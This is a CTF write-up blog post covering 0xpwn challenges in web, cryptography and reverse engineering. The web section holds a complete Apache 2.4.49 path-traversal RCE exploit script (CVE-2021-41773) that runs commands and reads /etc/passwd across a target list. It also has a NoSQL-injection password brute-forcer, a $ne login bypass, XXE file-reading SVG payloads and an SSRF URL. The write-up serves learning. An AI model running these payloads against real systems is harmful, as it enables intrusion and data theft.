---
title: "0xpwn Ctf Write Ups"
date: 2022-05-09T20:44:28+06:30
draft: false
---

# 0xpwn CTF write ups

Created: October 26, 2021 8:23 AM

3 days ago, I participated in 0xpwn's CTF.

Totally solved 13 challenges.

Here is my write up. Enjoy! 

## Web

### Apache War

Challenge name is a hint.I took a look at apache version.

![apache.jpeg](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/apache.jpeg)

There is a CVE(`CVE-2021-41773`) for apache 2.4.49.

Here is the exploit.

```bash
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Date: 10/05/2021
# Exploit Author: Lucas Souza https://lsass.io
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773
# Credits: Ash Daulton and the cPanel Security Team

#!/bin/bash

if [[ $1 == '' ]]; [[ $2 == '' ]]; then
echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
echo ./PoC.sh targets.txt /etc/passwd
exit
fi
for host in $(cat $1); do
echo $host
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done

# PoC.sh targets.txt /etc/passwd
# PoC.sh targets.txt /bin/sh whoami
```

![flag.jpeg](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/flag.jpeg)

flag : 0xpwn{Ap4ch3_cv3_z0z1_A177e}

---

### Find me

*Challenge description : There are 200users, even 200users are not admin, one of them can get flag.
Now you need to find who can take flag.*

I use the following script to crawl 200 usernames from server.

```bash
import requests
from bs4 import BeautifulSoup as bs4

url = 'http://ctf.0xpwn.com:8834/search.php'

req = requests.get(url)
soup = bs4(req.text)

td = soup.find_all('td')

for i in range(0,400):
    if i%2 != 0:
        print(td[i].text)
```

then use burp intruder to brute force cookie with this(200 usernames) payload.

![flag.jpeg](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/flag%201.jpeg)

flag : 0xpwn{n0w_Y0u_s3E_m3!!}

---

### Compiler

*Challenge description : Try to compile your code and take the flag!
Flag location : /flag*

There is a compiler service that accepts C code and then output compiled 64bit executable program.

If we include external header file using `#include` , it might be able to extract internal file.

Here, author give a hint that the flag is located at `/flag`.So if we run `#include "/flag"` , we got flag.

![flag_poc.png](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/flag_poc.png)

flag : 0xpwn{HOw_Y0u_iNclUd3_tHf_5lAg?}

---

### Login Please

It has a login page. Author provides source code and noticed that it uses MongoDB.

So I thought it might be nosql injection.

We can bypass admin login via `username[$ne]=1$password[$ne]=1` but the challenge is to get admin's password.

Here is the script to brute force password.

```python
#!/usr/bin/env python3

import requests
import string

url = "http://ctf.0xpwn.com:1337/"
headers = {"content-type": "application/json"}

leaked_data = list("")

while True:
    for character in string.printable:
        if character not in ["*", "+", ".", "?", "|", "\\", '"']:
            print(f"trying {''.join(leaked_data) + character}")

            payload = (
                '{"username": {"$eq": "admin"}, "password": {"$regex": "^%s"}}'
                % ("".join(leaked_data) + character,)
            )
            r = requests.post(url + "api/login", data=payload, headers=headers)

            if r.json() == {
                "logged":1,
                "message":"Login Successful, admin.",
            }:
                leaked_data.append(character)
                break
```

flag : 0xpwn{mOnGO_SqL_InJeCTIoN!@#}

---

### Fuzz Me Plz

*Challenge description : Use your recon skill and grab the flag!*

We have to find the hidden directory. We use `ffuf` and got `api` endpoint.

It says we are using outdated version, so we check out `v2` and yes,it exists.

Keep fuzzing and got `image` endpoint. Here we use `arjun` to brute force parameter and got `url` parameter.

![param.jpeg](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/param.jpeg)

Now URL becomes [http://ctf.0xpwn.com:32123/api/v2/image?url=](http://ctf.0xpwn.com:32123/api/v2/image?url=http://localhost:1337/robots.txt) .

When a service fetches external link, i always test about `SSRF` .I sent a request to [localhost](http://localhost) and check robots.txt. It tells us the flag location.

Final URL : [http://ctf.0xpwn.com:32123/api/v2/image?url=http://localhost:1337/admin/d0nt_t3ll_a2y0n3.txt](http://ctf.0xpwn.com:32123/api/v2/image?url=http://localhost:1337/admin/d0nt_t3ll_a2y0n3.txt)

![flag.png](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/flag.png)

flag : 0xpwn{0pps!_ho0w_d1d_y0u_g3t_h3re?!@#}

---

### Secure Image Converter

*Challenge description : We created our first image converter and it's very strongly extremely secure and impossible to be hacked.
Maybe could you pls find a way to heck?*

There is an image converter on their website.

If a service accepts SVG input, it might be vulnerable to `XXE,SSRF,XSS` attacks.

We check with the following payload and it works.

```html
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="2000px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

We can list directory using `file:///` .We found nothing on the directory, so i decided to look at `.bash_history` that usually stores a history of user commands entered at the terminal.There we got the flag location and got the flag.

Final payload : 

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///secret/ijk/flag.txt" > ]>
<svg width="2000px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

flag : 0xpwn{Expl0t10n_DtD_1s_A1way5_fuN_$@#!}

---

## Cryptography

### Mono Tone

Cipher : `HAELTFVWQFVNAEYAWLAVVMJKQFL`,Key : `oxpwn`

Since challenge name has "mono", we find all ciphers related to mono.

We found that it was mono alphabetic substitution cipher.We try to decode,but it was not the correct way. So we try to encode with given key and got the flag.

![mono_flag.png](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/mono_flag.png)

flag 0xpwn{CONGRATULATIONYOUGOTTHEFLAG}

---

### Anti-Clockwise

Author provides this ciphertext - TSSTIHTPIPIROOHSASNEINICR

We use cipher identifier ([https://www.boxentriq.com/code-breaking/cipher-identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)) and it suggests that the cipher might be `Column Transposition Cipher`.

We use this [https://www.boxentriq.com/code-breaking/columnar-transposition-cipher](https://www.boxentriq.com/code-breaking/columnar-transposition-cipher) to solve this challenge.

![anti-clockwise.png](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/anti-clockwise.png)

flag : 0xpwn{this is transposition cipher}

---

### Sugar RSA

In this challenge, author provides the following information.

`p = 71763624917728876791099483330184816807887355675460544671647557661228708417069`

`e = 65537`

`ct = 4346260422547079298472071091894924125389180210520126020051089651344814556178375076342797926718872103714202816758876851346433538678179161962055092532826609`

`phi = 5030659762807007970748019996776298304432494949729406989805331613853246541921118521518871848241397383202850888907220945803756419372359842382295105601014416`

that's all.

We can find the prime `q` with this equation : `q=(phi//(p-1))+1`.

Here is my code.

```python
from Crypto.Util.number import inverse
from Crypto.Util.number import long_to_bytes

e = 65537
p = 71763624917728876791099483330184816807887355675460544671647557661228708417069
q = 8204612572417026118768617011515888542574564488838511402098147924114709927502436689130292050355061107936036138480587406812700796637953617955461586707769221
c = 4346260422547079298472071091894924125389180210520126020051089651344814556178375076342797926718872103714202816758876851346433538678179161962055092532826609
phi = 5030659762807007970748019996776298304432494949729406989805331613853246541921118521518871848241397383202850888907220945803756419372359842382295105601014416

q = (phi//(p-1))+1

n = p*q
d = inverse(e,phi)
m = pow(c,d,n)
flag = (long_to_bytes(m))
print(f'flag : {flag}')
```

flag : 0xpwn{Th15_15_345y_RSA}

---

### 57n0F 61 75374L

Author provides this image - 

![challenge.PNG](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/challenge.png)

We got hint by reversing the challenge name : L47357 16 F0n75

It means " latest 16 fonts?"

Search on google and i got a symbol font named `DIngbat Cobogo`.

flag : 0xpwn{7h!5_!5_7h3_f0n7_c!ph3R}

---

### Numeral System

*Challenge description : This is the "standard positional numeral systems".
You need to break base series and find the flag.*

Author provides a large file (300mb for text file :3) which contains base32 string. 

We have to decode base32>hex>base64>hex>base85>hex for 5 times.

I do it manually :') such a pain.

Not a good one but i'll provide this sh*ty code. (will only work manually)

```python
import base64,codecs

#base32
src_file = open('12th_hex_file','r').read()[15:-1]
base32_decode = base64.b32decode(src_file).decode('utf-8')
b32_file = open('5th_b32_file','w')
b32_file.write(base32_decode)

#hex
h3x = open('5th_b32_file','r').read()[13:].strip().replace(' ','')
hex_decode = codecs.decode(h3x,'hex')
hex_file = open('13th_hex_file','w')
hex_file.write(str(hex_decode))

#base64
base_64 = open('13th_hex_file','r').read()[15:-1]
b64_decode = base64.b64decode(base_64).decode('utf-8')
b64_file = open('5th_b64_file','w')
b64_file.write(b64_decode) 

#2nd hex
h3x = open('5th_b64_file','r').read()[13:].strip().replace(' ','')
hex_decode = codecs.decode(h3x,'hex')
hex_file = open('14th_hex_file','w')
hex_file.write(str(hex_decode))

#base85
base_85 = open('14th_hex_file','r').read()[15:-1]
b85_decode = base64.b85decode(base_85).decode('utf-8')
b85_file = open('5th_b85_file','w')
b85_file.write(b85_decode)

#3rd hex
h3x = open('5th_b85_file','r').read()[13:].strip().replace(' ','')
hex_decode = codecs.decode(h3x,'hex')
hex_file = open('15th_hex_file','w')
hex_file.write(str(hex_decode))
```

The last two are base58 and base91.

flag : 0xpwn{B453_l00p1nG}

---

### RE

### CredChecker

Author provides a html file named `admin.html`.We have to reverse this. 

*Note : i removed some unnecessary parts like style tag.*

```html
<script>
var form = document.getElementById("credform");
var username = document.getElementById("usrname");
var password = document.getElementById("psw");
var info = document.getElementById("infolabel");
var checkbtn = document.getElementById("checkbtn");
var encoded_key = "akpJBDQ8MQBXY0g1GAIjbzFcCQQ0GDcXVDIYNSthKw=="

function dataEntered() {
        if (username.value.length > 0 && password.value.length > 0) {
                checkbtn.disabled = false;
        } else {
                checkbtn.disabled = true;
        }
}

function checkCreds() {
        if (username.value == "Admin" && atob(password.value) == "goldenticket") 
        {
                var key = atob(encoded_key);
                var flag = "";
                for (let i = 0; i < key.length; i++)
                {
                        flag += String.fromCharCode(key.charCodeAt(i) ^ password.value.charCodeAt(i % password.value.length))
                }
                document.getElementById("banner").style.display = "none";
                document.getElementById("formdiv").style.display = "none";
                document.getElementById("message").style.display = "none";
                document.getElementById("final_flag").innerText = flag;
                document.getElementById("winner").style.display = "block";
        }
        else
        {
                document.getElementById("message").style.display = "block";
        }
}

</script>
```

In checkCreds function - if username is `Admin` and  the value of password's base64 decode is `goldenticket`, we got flag. So we generate base64 value with `btoa('goldenticket')` in JavaScript console and got `Z29sZGVudGlja2V0`

Then we enter username : `Admin` password : `Z29sZGVudGlja2V0`, we got flag.

![golden-ticket.png](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/golden-ticket.png)

flag : 0xpwn{gu3$$_y0u_kn0wn_ab0ut_JS}

---

## Can you decrypt it?

Author provides a python script file which decode base16 string.

If we run that script, it outputs another python script that decode in base16>base32>base64.

Author use `exec` function, and i remove that `exec()`,assign as a variable and then output it.

Like this one - 

```python
import base64;
payload = base64.b64decode((base64.b32decode((base64.b16decode('4D464C5443353343474E464441534B484A4A5547474D5356474A48454334444E4D4E57545335434A4A4248444159334E4E52325655364B434F425246515154574D4E5846435A33434B354448455753594B4A345653565A56504A42574F33324C4C4A44564D334B4A49354A4759574A53484656565556525A4E464D565154544D4A4E44564D354B5A47493457575753584B465A56535633594F3551554F52544A4C4A4D4643343344474E4A475159544E4B4A554747334B534D5A4D57325254324C4A4A57574E53444E4641574F534B44494A574745334B4F4F5A4E454F56544C4A464344415A32324B343257555952534B4A574655515A5647425257325254564D4D5A485132444549354B5736595358495A5A465557435350464D564F4E4C324A4E44554D3433444935554751574C4E4B59594559513243504A53454F5254564C4A44554D364B324959345753574B594A5A57455755334C4A4E455547514C484A4644564533435A47493457575753584B465456415532434E464D565154544D4A5A564643354B5A4E4A4758535753484B5A5647454D53534E5246554F5654564C455A44533232324B3549584151334A494654555351324350464E46515552524D4E5754495A323249354C47555952534B4A574655514C504A4E52544556544B4D4E57564D4D434A495159474F534C4B4D51324745563247504A4D54475752574A5A5847493244444E565347365A4348475159453233534E47424847323333324D464346553433464B524958535453584B4A5A4743534445475A47585553544D4D4A57554B4D544447495944415953584E4E3547453654454E4E53464F345A5A4B424B44414F4B4A4D35585557594A534B593255535242514D354557595353474C41594749554353494E45555751334F4A59594653565A564E4E4D565153544C4C415A4555324444474A4B574F5543544946584643564B4B49524A454B5653484B495947515353544E4E324532564356475649464B5253474B4E4B54435553574B5A574749574B584B5A585853544C324B45595534325444484646484F33324C4C4A44564D325443474A4A475957534449453455535232534E524D54454F4C4C4C4A4C4453324B5A4C424847595332494A5A5746534D324B4E5253454735334F4A565645324D434F4B524D5447574B584A4A5646555232574E564E44453244514D465758493433434B3432584D593249495A3457474D325347465347345A42554D564D47364F4B4B50463448555A4348495A32565552324750464E454D4F4C4A4C464D453433434C4B4658555759334E4B5A3545535242514D35455753534B4C4C4A575453364B4A4A4254574F594B584752545747334B474F564E4445564C504A564258513432324B343247365753484B5A5647454D53534E524E45473233514A355457365A324A494E41574F59334E4B5A354553513354484645554F5454504D4E5557513554444E564957365753484B5A5647454D53534E524E454D3542554C424A57575A32594E4642484D59334E4B465857434D535747564C54475A334D4D4A44564D354B4C49353247595A4B544E5253455755334C4A4E42573451545A4D464C544B4D434C4A42484759574A544A4A57474951334C4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A5046475755534C5A4A56564553364B4E4E4A455853544C4B4A4634553232534A50464757553D3D3D')))))
print payload
```

When i run script, i redirect output to new file, remove `exec`  create a variable, and on third time it reveals the real source code.

```python
import base64
from string import maketrans

def decode_base(encoded,alphabet,standard_base):
    encoded = encoded.translate(maketrans(alphabet, standard_base))
    decoded = base64.b32decode(encoded)
    return decoded

secret = "7xmascvz6warghtn42s46j3h6ly425dkhwz32ena6sm4mi3o7duk===="

key = "RE_GOD"

standard_base = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567='

decoded = decode_base(secret,'234567abcdefghijklmnopqrstuvwxyz=',standard_base)

res = ""
for x in range(0,len(decoded)):
    res += chr(ord(decoded[x]) ^ ord(key[x%len(key)]))

print(secret)########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################
```

As u notice, it does not print res but secret. We have to print the `res` which is the flag.

`}!3d0c_3ht_tpyrc3d_u0y_n4c{nwpx0` is a flag but we need to reverse it.

![flag.jpeg](0xpwn%20CTF%20write%20ups%20dc54ce1a7ed64e10ae1253271fc8e453/flag%202.jpeg)

flag : 0xpwn{c4n_y0u_d3crypt_th3_c0d3!}

---

That is all i solved.

Thanks for reading.

By *Thwin Htet Win*
